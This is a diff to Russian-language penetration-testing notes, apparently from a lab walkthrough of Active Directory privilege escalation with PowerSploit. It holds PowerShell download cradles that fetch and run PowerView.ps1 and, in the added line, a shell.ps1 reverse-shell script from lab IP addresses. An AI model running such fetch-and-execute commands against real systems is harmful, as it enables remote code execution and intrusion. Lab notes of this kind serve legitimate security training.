@@ -10,6 +10,8 @@ https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/
 
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/PowerView.ps1')
 
+"powershell "IEX(New-Object Net.WebClient).downloadString(''http://10.10.14.9/shell.ps1'')""   ---Бывает и так!!!!!
+
 Поскольку у нас нет оболочки для JDgodd, мы можем использовать PowerShell.
  System.Management.Automation.PSCredential для хранения учетных данных в нашей текущей оболочке.
 
